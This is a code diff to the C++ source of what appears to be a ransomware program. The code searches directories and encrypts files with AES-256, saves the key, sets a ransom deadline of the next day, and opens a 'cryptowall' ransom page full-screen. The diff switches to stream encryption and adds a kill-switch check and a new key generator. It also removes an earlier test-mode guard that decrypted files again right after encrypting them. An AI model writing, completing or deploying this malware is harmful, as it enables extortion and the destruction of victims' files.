@@ -13,6 +13,8 @@
 #endif
 
 #include "aes.h"
+#include "drm.h"
+#include "random.h"
 
 unsigned int cant_files = 0;
 
@@ -36,9 +38,9 @@ bool isValidFile(char* file) {
 /*
   To encrypt files using AES 256, the file size must be a multiple of 16 bytes
   This function adds 1 to 16 bytes to the file using ANSI X9.23 padding method
-  and returns the new file size
 */
-uint32_t ANSI_X9_23(FILE* file) {
+void ANSI_X9_23(char* filename) {
+  FILE* file = fopen(filename, "rb+");
   fseek(file, 0, SEEK_END);
   uint32_t size = ftell(file);
   uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
@@ -49,13 +51,7 @@ uint32_t ANSI_X9_23(FILE* file) {
   fwrite(pad, sizeof(uint8_t), len, file);
   rewind(file);
   delete[] pad;
-  size += len;
-  return size;
-}
-
-// This function does the opposite of the previous one
-void unpad(uint8_t* buffer, uint32_t &size) {
-  size -= buffer[size - 1];
+  fclose(file);
 }
 
 void EncryptFile(char* fname, const uint8_t* key) {
@@ -63,22 +59,14 @@ void EncryptFile(char* fname, const uint8_t* key) {
   printf("%s\n", fname);
   cant_files++;
 
-  FILE* file = fopen(fname, "rb+");
-  uint32_t size = ANSI_X9_23(file);
-  uint8_t* input = new uint8_t[size];
-  fread(input, 1, size, file);
-  fclose(file);
+  ANSI_X9_23(fname);
+  AES_stream_encrypt(fname, key);
 
-  AES_encrypt(input, size, key);
-
-  /// DELETE THE NEXT TWO LINES TO ENCRYPT FILES!!!
-  AES_decrypt(input, size, key);
-  unpad(input, size);
-
-  file = fopen(fname, "wb");
-  fwrite(input, sizeof(uint8_t), size, file);
-  delete[] input;
-  fclose(file);
+  char* dest = new char[strlen(fname) + 11];
+  strcpy(dest, fname);
+  strcat(dest, ".encrypted");
+  AES_stream_decrypt(dest, key);
+  delete[] dest;
 }
 
 void SearchFiles(const char* sDir, const uint8_t* key) {
@@ -123,16 +111,12 @@ int main() {
   // Delete the next two slashes to hide console:
 #ifdef _WIN32
   //FreeConsole();
-#else
-  
 #endif
 
+  if (KillSwitch()) exit(EXIT_FAILURE);
+
   /// GENERATE KEY
-  uint8_t key[32];
-  time_t seed = time(NULL);
-  srand(seed);
-  for (uint8_t i = 0; i < 32; i++)
-    key[i] = rand() % 256;
+  uint8_t* key = advandedRNG();
 
   /// SAVE KEY TO FILE
   FILE* kfile = fopen("key.bin", "wb");
@@ -153,8 +137,8 @@ int main() {
 #endif
 
   /// GET TIME OF TOMORROW
-  time_t time = seed + 24 * 60 * 60;
-  tm* timeinfo = localtime(&time);
+  time_t timenow = time(NULL) + 24 * 60 * 60;
+  tm* timeinfo = localtime(&timenow);
   unsigned int year = timeinfo->tm_year + 1900;
   unsigned int month = timeinfo->tm_mon + 1;
 
@@ -205,11 +189,14 @@ int main() {
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
   system("fullscreen.vbs");
 #else
-  system("firefox -new-window cryptowall/index.htm");
+  //system("firefox -new-window cryptowall/index.htm");
   sleep(2);
   system("xdotool key Alt+Tab");
   sleep(1);
   system("xdotool key F11");
 #endif
+
+  remove("ip");
+  delete[] key;
   return 0;
 }
